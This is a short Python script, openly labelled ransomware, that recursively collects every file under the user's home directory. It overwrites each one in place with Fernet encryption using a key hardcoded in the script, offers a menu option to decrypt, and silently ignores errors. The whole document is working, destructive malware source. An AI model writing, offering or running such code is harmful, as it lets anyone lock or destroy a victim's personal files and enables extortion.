from pathlib import Path
from cryptography.fernet import Fernet

def getFiles(p):
    flist = p.glob('**/*')
    files = [x for x in flist if x.is_file()]
    return files

def encrypt(filee):
    with open(filee, 'rb') as file: original = file.read()
    encrypted = fernet.encrypt(original)
    with open(filee, 'wb') as encrypted_file: encrypted_file.write(encrypted)

def decrypt(filee):
    with open(filee, 'rb') as file: content = file.read()
    decrypted = fernet.decrypt(content)
    with open(filee, 'wb') as file: file.write(decrypted)

def showMenu():
    print('[RANSOMWARE MENU]')
    print('\t1)Encrypt files')
    print('\t2)Decrypt files')
    return(int(input('Option: ')))

#Configure starting path of the ransomware
path = Path(Path.home()).absolute()
foldername = path
files = getFiles(foldername)
#Cryptography key
fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')

print('Calculating number of files..')
size = len(files)
print(f'Number of files: {size}\n')

opt = showMenu()
while opt != 9:
    if opt == 1: 
        for index,x in enumerate(files):
            print(f'Encrypting file {index + 1}/{size}')
            try: encrypt(x)
            except Exception: pass
    if opt == 2:
        for index,x in enumerate(files):
            print(f'Decrypting file {index + 1}/{size}')
            try: decrypt(x)
            except Exception: pass
    opt = showMenu()
